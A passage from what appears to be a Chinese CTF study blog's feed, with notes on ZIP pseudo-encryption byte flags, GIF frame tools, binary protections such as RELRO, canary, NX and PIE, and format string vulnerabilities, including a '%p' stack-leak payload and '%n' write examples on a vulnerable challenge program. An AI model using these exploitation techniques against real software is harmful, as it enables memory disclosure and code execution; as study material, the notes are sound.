    <content type="html"><![CDATA[<h2 id="ZIP-伪加密原理"><a href="#ZIP-伪加密原理" class="headerlink" title="ZIP 伪加密原理"></a>ZIP 伪加密原理</h2><blockquote><p>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包</p></blockquote><hr><h2 id="ZIP-伪加密自动化识别与修复工具"><a href="#ZIP-伪加密自动化识别与修复工具" class="headerlink" title="ZIP 伪加密自动化识别与修复工具"></a>ZIP 伪加密自动化识别与修复工具</h2><h3 id="ZipCenOp-jar"><a href="#ZipCenOp-jar" class="headerlink" title="ZipCenOp.jar"></a>ZipCenOp.jar</h3><ul><li>下载安装：<a href="https://github.com/442048209as/ZipCenOp/releases/tag/1.0">Release 1.0 · 442048209as/ZipCenOp</a></li><li>使用：<code>java -jar ZipCenOp.jar r &lt;zip 文件名&gt;</code></li></ul><h3 id="WinRAR"><a href="#WinRAR" class="headerlink" title="WinRAR"></a>WinRAR</h3><ul><li>进入 “工具”，修复压缩文件</li></ul><hr><h2 id="ZIP-文件的结构"><a href="#ZIP-文件的结构" class="headerlink" title="ZIP 文件的结构"></a>ZIP 文件的结构</h2><blockquote><p>一个 ZIP 文件由三个部分组成</p></blockquote><ul><li><h3 id="压缩源文件-——-数据区"><a href="#压缩源文件-——-数据区" class="headerlink" title="压缩源文件 —— 数据区"></a>压缩源文件 —— 数据区</h3><p><mark>50 4B 03 04：这是头文件标记（0x04034b50）</mark><br>14 00：解压文件所需 pkware 版本<br><mark>09 00：全局方式位标记（有无加密）</mark><br>08 00：压缩方式<br>50 A3：最后修改文件时间<br>A5 4A：最后修改文件日期<br>21 38 76 64：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>08 00：文件名长度<br>00 00：扩展记录长度</p></li><li><h3 id="压缩源文件-——-目录区"><a href="#压缩源文件-——-目录区" class="headerlink" title="压缩源文件 —— 目录区"></a>压缩源文件 —— 目录区</h3><p><mark>50 4B 01 02：目录中文件文件头标记(0x02014b50)</mark><br>1F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br><mark>09 00：全局方式位标记（有无加密，<strong><em>更改这里进行伪加密</em></strong>，改为09 00打开就会提示有密码了）</mark><br>08 00：压缩方式<br>50 A3：最后修改文件时间<br>A5 4A：最后修改文件日期<br>21 38 76 65：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>08 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量</p></li><li><h3 id="压缩源文件-——-目录结束标志"><a href="#压缩源文件-——-目录结束标志" class="headerlink" title="压缩源文件 —— 目录结束标志"></a>压缩源文件 —— 目录结束标志</h3><p><mark>50 4B 05 06：目录结束标记</mark><br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>5A 00 00 00：目录区尺寸大小<br>3F 00 00 00：目录区对第一张磁盘的偏移量<br>00 00 00：ZIP 文件注释长度</p></li></ul><hr><h2 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h2><div class="table-container"><table><thead><tr><th>区域</th><th>参数</th></tr></thead><tbody><tr><td>数据区的全局加密</td><td>00 00</td></tr><tr><td>目录区的全局方式位标记</td><td>00 00</td></tr></tbody></table></div><hr><h2 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h2><div class="table-container"><table><thead><tr><th>区域</th><th>参数</th></tr></thead><tbody><tr><td>数据区的全局加密</td><td>00 00</td></tr><tr><td>目录区的全局方式位标记</td><td>09 00</td></tr></tbody></table></div><hr><h2 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h2><div class="table-container"><table><thead><tr><th>区域</th><th>参数</th></tr></thead><tbody><tr><td>数据区的全局加密</td><td>09 00</td></tr><tr><td>目录区的全局方式位标记</td><td>09 00</td></tr></tbody></table></div><hr><h2 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h2><div class="table-container"><table><thead><tr><th>加解密</th><th>方法</th></tr></thead><tbody><tr><td>去除密码</td><td><mark><strong>压缩源文件目录区 的 全局方式位标记 的 01 00 或 09 00 改为 00 00</strong></mark></td></tr><tr><td>添加密码提示</td><td>压缩源文件目录区 的 全局方式位标记 的 00 00 改为 01 00 或 09 00</td></tr></tbody></table></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ZIP-伪加密原理&quot;&gt;&lt;a href=&quot;#ZIP-伪加密原理&quot; class=&quot;headerlink&quot; title=&quot;ZIP 伪加密原理&quot;&gt;&lt;/a&gt;ZIP 伪加密原理&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;zip伪加密是在文件头的加密标志位做修改，进而再打开文件时</summary>
      
    
    
    
    <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>GIF图片拆分&amp;拼图</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/GIF%E5%9B%BE%E7%89%87%E6%8B%86%E5%88%86-%E6%8B%BC%E5%9B%BE/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Misc/GIF%E5%9B%BE%E7%89%87%E6%8B%86%E5%88%86-%E6%8B%BC%E5%9B%BE/</id>
    <published>2023-03-19T07:56:04.000Z</published>
    <updated>2023-03-19T07:58:30.545Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><hr><h3 id="拆分并直接展示"><a href="#拆分并直接展示" class="headerlink" title="拆分并直接展示"></a>拆分并直接展示</h3><ul><li>在线网站：<a href="https://tu.sioe.cn/gj/fenjie/">GIF动态图片分解，多帧动态图分解成多张静态图片</a></li></ul><h3 id="拆分"><a href="#拆分" class="headerlink" title="拆分"></a>拆分</h3><ul><li>在线网站：<a href="https://uutool.cn/gif2img/">在线GIF图片帧拆分工具 - UU在线工具</a></li></ul><h3 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h3><ul><li>下载：<a href="https://imagemagick.org/script/download.php#windows">图像魔术 – 下载</a></li><li>使用：<ol><li>到需要拼接的图片目录下，调用 <code>cmd</code></li><li>使用命令：<code>magick montage *.png -tile &lt;10x10&gt; -geometry +0+0 flag.png</code> 【10x10表示拼成横竖10张的图】</li></ol></li></ul><hr><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><hr><h3 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h3><ul><li>使用：<code>convert &lt;.gif文件名&gt; &lt;输出路径/flag.png&gt;</code></li></ul><h3 id="montage"><a href="#montage" class="headerlink" title="montage"></a>montage</h3><ul><li>下载安装：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> graphicsmagick-imagemagick-compat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用：<code>montage *.png -tile &lt;10x10&gt; -geometry +0+0 flag.png</code> 【10x10表示拼成横竖10张的图】</li></ul><h3 id="gaps"><a href="#gaps" class="headerlink" title="gaps"></a>gaps</h3><ul><li>下载安装：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/nemanja-m/gaps.git<span class="token builtin class-name">cd</span> gaps  pip <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txt  <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-tk  pip <span class="token function">install</span> <span class="token parameter variable">-e</span> <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Windows&quot;&gt;&lt;a href=&quot;#Windows&quot; class=&quot;headerlink&quot; title=&quot;Windows&quot;&gt;&lt;/a&gt;Windows&lt;/h2&gt;&lt;hr&gt;
&lt;h3 id=&quot;拆分并直接展示&quot;&gt;&lt;a href=&quot;#拆分并直接展示&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="杂项" scheme="https://4ss1du0us.github.io/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="MISC" scheme="https://4ss1du0us.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>文件保护机制</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn/%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn/%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</id>
    <published>2023-03-19T07:39:49.000Z</published>
    <updated>2023-03-19T07:52:15.432Z</updated>
    
    <content type="html"><![CDATA[<h2 id="查看文件类型"><a href="#查看文件类型" class="headerlink" title="查看文件类型"></a>查看文件类型</h2><ul><li><code>file &lt;文件名&gt;</code><br><img src="https://s2.loli.net/2023/03/17/7lQIL4sMZbPWdxY.png" alt="CTF - Pwn_文件保护机制1.png"></li></ul><hr><h2 id="查看文件保护机制"><a href="#查看文件保护机制" class="headerlink" title="查看文件保护机制"></a>查看文件保护机制</h2><ul><li><strong>Kali：</strong><code>checksec &lt;文件名&gt;</code></li><li><strong>Ubuntu：</strong><code>checksec --file=&lt;文件名&gt;</code><br><img src="https://s2.loli.net/2023/03/17/kWEDwX8tOBRQCsZ.png" alt="CTF - Pwn_文件保护机制2.png"></li></ul><hr><ul><li><h3 id="Arch：程序架构信息"><a href="#Arch：程序架构信息" class="headerlink" title="Arch：程序架构信息"></a>Arch：程序架构信息</h3><ul><li>判断文件是 64位 还是 32位，exp 编写是 p64 还是 p32</li><li><code>p32()</code> 是对整数进行打包，转换成二进制的形式，比如转换成地址【<code>p64()</code> 处理后形成<strong>小端序</strong>字节码】<br><code>p32</code>、<code>p64</code> 是打包为二进制<br><code>u32</code>、<code>u64</code> 是解包为二进制</li><li><mark>32位</mark>：cpu 一次处理 32位 数据，即 4 字节，相当于地址的宽度，即 <code>sizeof(*p)</code>，虚拟地址大小为 4G，即有 $2^{32}$ 个地址，从 32个0 到 32个1 的地址<br><mark>64位</mark>：cpu 一次处理 64位 数据，即 8 字节，相当于地址的宽度，即 <code>sizeof(*p)</code>，虚拟地址大小为 128G，即 $2^{64}$ 个地址，从 64个0 到 64个1 的地址</li><li><strong>函数调用方式的区别</strong><ul><li><mark>32位</mark> 程序默认调用函数的方式<ol><li>将参数压入栈中</li><li>靠近 call 指令的是第一个参数</li><li>然后 call</li></ol></li><li><mark>64位</mark> 程序默认调用函数的方式<ol><li>RDI 中存放第1个参数</li><li>RSI 中存放第2个参数</li><li>RDX 中存放第3个参数</li><li>RCX 中存放第4个参数</li><li>R8 中存放第5个参数</li><li>R9 中存放第6个参数</li><li>如果还有更多的参数，再把过多那几个参数像32位程序一样压入栈中</li><li>然后call</li></ol></li></ul></li></ul></li></ul><hr><ul><li><h3 id="RELRO（Relocation-Read-Only，堆栈地址随机化）：用于加强对-binary-数据段的保护的技术"><a href="#RELRO（Relocation-Read-Only，堆栈地址随机化）：用于加强对-binary-数据段的保护的技术" class="headerlink" title="RELRO（Relocation Read-Only，堆栈地址随机化）：用于加强对 binary 数据段的保护的技术"></a>RELRO（Relocation Read-Only，堆栈地址随机化）：用于加强对 binary 数据段的保护的技术</h3><ol><li>主要针对 GOT 改写的攻击方式：<ul><li><strong>Partial RELRO（部分开启，GOT 可写）</strong>，易受到攻击，例如攻击者可以 atoi.got 为 system.plt，进而输入/bin/sh\x00获得shell</li><li><strong>Full RELRO（全部开启，GOT 不可写）</strong>，使整个 GOT 只读，从而无法被覆盖，意味着我们无法修改 GOT表。但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号</li></ul></li></ol></li></ul><hr><ul><li><h3 id="Stack（canary-金丝雀，一种用来防护栈溢出的保护机制）：栈溢出检查"><a href="#Stack（canary-金丝雀，一种用来防护栈溢出的保护机制）：栈溢出检查" class="headerlink" title="Stack（canary 金丝雀，一种用来防护栈溢出的保护机制）：栈溢出检查"></a>Stack（canary 金丝雀，一种用来防护栈溢出的保护机制）：栈溢出检查</h3><ol><li>Canary found 表示开启了 Canary 保护。不能直接用溢出的方法覆盖栈中返回地址</li><li>函数每一次执行时，在栈上随机产生一个Canary值【在函数的入口处，先从 fs/gs 寄存器中取出一个4字节（eax）或者8字节（rax）的值存到栈上】，当函数结束时，会检查这个栈上的值是否和存进去的值一致</li><li>如果不合法，就会停止程序运行，作用相当于校验信息的 cookie</li><li>攻击者在覆盖返回地址的时候往往也会将 Canary 信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过</li></ol></li></ul><hr><ul><li><h3 id="NX（No-eXecute，栈不可执行）"><a href="#NX（No-eXecute，栈不可执行）" class="headerlink" title="NX（No-eXecute，栈不可执行）"></a>NX（No-eXecute，栈不可执行）</h3><ol><li>如果这个保护开启，就意味着栈中数据没有执行权限，程序将数据段和代码段分开了，因此不能将返回地址导向 shellcode 中</li><li>NX 基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令</li><li>如此一来，当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过</li></ol></li></ul><hr><ul><li><h3 id="PIE（Position-Independent-Executable，位置无关可执行文件）"><a href="#PIE（Position-Independent-Executable，位置无关可执行文件）" class="headerlink" title="PIE（Position-Independent Executable，位置无关可执行文件）"></a>PIE（Position-Independent Executable，位置无关可执行文件）</h3><ol><li>PIE在编译时将程序编译为位置无关，程序运行的各个段加载的虚拟地址在装载时确定（地址随机化）</li></ol></li></ul><hr><ul><li><h3 id="RWX"><a href="#RWX" class="headerlink" title="RWX"></a>RWX</h3><ol><li>Linux 的权限不是很细致，只有RWX三种：<ul><li><strong>r (Read，读取)</strong>：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目录的权限</li><li><strong>w (Write，写入)</strong>：对文件而言，具有新增、修改、删除文件内容的权限；对目录来说，具有新建、删除、修改、移动目录内文件的权限</li><li><strong>x (eXecute，执行)</strong>：对文件而言，具有执行文件的权限；对目录而言该用户具有进入目录的权限</li></ul></li><li>目录的只读访问不允许使用 <code>cd</code> 进入目录，必须要有执行的权限才能进入</li><li>只有执行权限只能进入目录，不能看到目录下的内容，要想看到目录下的文件名和目录名，需要可读权限</li><li>一个文件能不能被删除，主要看该文件所在的目录对用户是否具有写权限，如果目录对用户没有写权限，则该目录下的所有文件都不能被删除，文件所有者除外</li><li>目录的 <strong>w</strong> 位不设置，即使你拥有目录中某文件的 <strong>w</strong> 权限也不能写该文件</li></ol></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;查看文件类型&quot;&gt;&lt;a href=&quot;#查看文件类型&quot; class=&quot;headerlink&quot; title=&quot;查看文件类型&quot;&gt;&lt;/a&gt;查看文件类型&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;file &amp;lt;文件名&amp;gt;&lt;/code&gt;&lt;br&gt;&lt;img src=&quot;https</summary>
      
    
    
    
    <category term="二进制漏洞利用" scheme="https://4ss1du0us.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="PWN" scheme="https://4ss1du0us.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-03-19T07:39:40.000Z</published>
    <updated>2023-03-19T07:52:00.229Z</updated>
    
    <content type="html"><![CDATA[<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><blockquote><p>格式化字符串漏洞，是由编程时使用 <code>printf</code> 函数，在将数据格式化输出时产生的漏洞</p><p>其中 <code>*printf()</code> 函数包括 <code>printf</code>，<code>fprintf</code>，<code>sprintf</code>，<code>snprintf</code>，<code>vprintf</code>，<code>vfprintf</code>，<code>vsprintf</code>，<code>vsnprintf</code> 等函数，它们可以将数据格式化后输出</p><p>一旦程序编写不规范，比如正确的写法是：<code>printf(&quot;%s&quot;, pad)</code>，偷懒写成了：<code>printf(pad)</code>，此时就存在格式化字符串漏洞</p></blockquote><hr><ul><li><p><strong>在pwn题中遇到格式化字符串漏洞时，我们一般会分两大步实现漏洞利用：</strong></p><ol><li>第一步构造一个payload，寻找输入字符串到栈顶指针的偏移</li><li>第二步就是攻击了，利用找到的偏移，在偏移处填入目的地址可以实现目的地址的内容泄露以及内容改写</li></ol></li><li><p><strong>格式化输出说明符</strong><br><img src="https://s2.loli.net/2023/03/17/qwXZ6MnSIjRvDLK.png" alt="CTF - Pwn_格式化字符串漏洞1.png"></p><ol><li><code>%n</code> 是一个不常见的格式化字符串，可以将一个 <code>int</code> 型的值（4字节）写入指定的地址中，这将可以实现栈空间的随意改写</li><li>除了 <code>%n</code>，还有 <code>%hn</code>、<code>%hhn</code>、<code>%lln</code>，分别为写入目标空间 2字节、1字节、8字节，这里的字节对应的是参数的地址开始的几字节</li></ol></li></ul><hr><h3 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h3><ul><li><p><code>printf()</code> 并不是一般的函数，它是C语言中少有的支持可变参数的库函数。所以，在被调用之前，被调用者无法知道函数调用之前有多少个参数被压入栈中。所以，<code>printf</code> 函数要求传入一个 <code>format</code> 参数以指定参数的数量和类型，然后 <code>printf</code> 函数就会严格的按照 <code>format</code> 参数所规定的格式逐个从栈中取出并输出参数</p></li><li><p><code>printf(&quot;%s %s %s %s %s\n&quot;, str1,str2,str3,str4,str5)</code></p><ol><li><strong>若 <code>printf</code> 函数中低于 6个 参数，则直接将值传给寄存器，按照参数的顺序，从左到右依次为 <code>edi</code>，<code>rsi</code>，<code>rdx</code>，<code>rcx</code>，<code>r8</code>，<code>r9</code></strong></li></ol></li><li><code>printf(&quot;%s %s %s %s %s %s %s %s %s %s %s\n&quot;, str1,str2,str3,str4,str5,str6,str7,str8,str9,str10,str11)</code><ol><li><strong>若 <code>printf</code> 函数中多于 6个 参数，从 第七个 参数才开始压栈</strong></li></ol></li></ul><hr><h3 id="关于-和-n"><a href="#关于-和-n" class="headerlink" title="关于 $ 和 %n"></a>关于 <code>$</code> 和 <code>%n</code></h3><blockquote><p><code>$</code> 号是用来指定参数的</p></blockquote><ul><li><strong><code>$n</code> 演示：</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"hello "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"world "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str3<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"I "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str4<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"am "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str5<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"Tom "</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%2$s %s %s %s %s %s\n"</span><span class="token punctuation">,</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">,</span>str3<span class="token punctuation">,</span>str4<span class="token punctuation">,</span>str5 <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>输出：<br>world hello world I am Tom</li></ul><blockquote><p>通过 <code>%n$p</code>，合理控制 <code>n</code> 就能获取栈中数据</p></blockquote><hr><ul><li><strong><code>%n</code> 演示：</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"111111"</span><span class="token punctuation">;</span><span class="token keyword">char</span> str2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"222222"</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%%48c%2$hhn \n"</span><span class="token punctuation">,</span>str1<span class="token punctuation">,</span>str2 <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c %c %c %c\n"</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>输出：<br>%48c<br>4 32 32 32</li></ul><hr><div class="table-container"><table><thead><tr><th style="text-align:left">目的</th><th style="text-align:left">实现</th></tr></thead><tbody><tr><td style="text-align:left">读取栈上某地址的大概格式</td><td style="text-align:left"><code>%%参数顺序$类型n</code>，譬如：<code>%7$lx</code>，就是以 <code>lx</code> 格式读 第7个 参数的值</td></tr><tr><td style="text-align:left">做写入的一般格式</td><td style="text-align:left"><code>%%数值c%参数顺序$类型</code>，譬如说：<code>%%40c%5$hhn</code>，就是向 第5个 参数写入 40 这个数值</td></tr></tbody></table></div><hr><ul><li><strong>如果给出的 <code>format</code> 参数的个数 &gt; 待输出的参数数量</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s %d %d %d %d %x %x"</span><span class="token punctuation">,</span><span class="token string">"num"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>输出：<br>1 2 3 33 test 1a1390 4013e8</li></ul><blockquote><p>虽然给了 7个 格式化输出的参数，但是实际压入栈中的参数只有 5个，所以，<code>printf</code> 会输出两个本不应该输出的地址内容，借助这个漏洞，我们就泄露出了栈中的数据</p></blockquote><hr><h2 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h2><h3 id="泄露任意地址内容"><a href="#泄露任意地址内容" class="headerlink" title="泄露任意地址内容"></a>泄露任意地址内容</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"please tell me your name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token number">0xAu</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"leave your message please:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v8<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello %s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"your message is:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> pwnme <span class="token operator">==</span> <span class="token number">8</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you pwned me, here is your flag:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Thank you!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>看到第7行，<code>printf</code> 输出了在前面输入的 <code>v8</code> 变量，但是并没有给出任何格式化参数，所以我们可以通过构造 <code>v8</code> 的值来让 <code>printf</code> 误以为程序给出了格式化参数，从而乖乖的按照我们的意思输出我们所需的值</p></blockquote><ul><li>输出：<br><em>please tell me your name:</em><br><code>aaaa</code><br><em>leave your message please:</em><br><code>AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</code><br><em>hello aaaa</em><br><em>your message is:</em><br><code>AAAA 0xffffd13e 0xf7fae580 0xffffd19c 0xf7ffdae0 0x1 0xf7fcb410 0x61610001 0xa6161 (nil) 0x41414141 0x25207025 0x70252070 0x20702520 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025</code><br><em>Thank you!</em></li></ul><blockquote><p>显然，程序泄露出了我们想要知道的 <code>printf</code> 函数的栈帧中输出字符串后 19个 内存单元的值，理论上来说，我们可以使用这个漏洞来进行任意读取栈中的值</p></blockquote><hr><h3 id="修改任意地址值"><a href="#修改任意地址值" class="headerlink" title="修改任意地址值"></a>修改任意地址值</h3><blockquote><p>任意地址写就要用到上面说的 <code>%n</code> 了</p></blockquote><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the usage of %n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"c = %d\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>输出：<br>c = 13</li></ul><blockquote><p>就是说，<strong><code>%n</code> 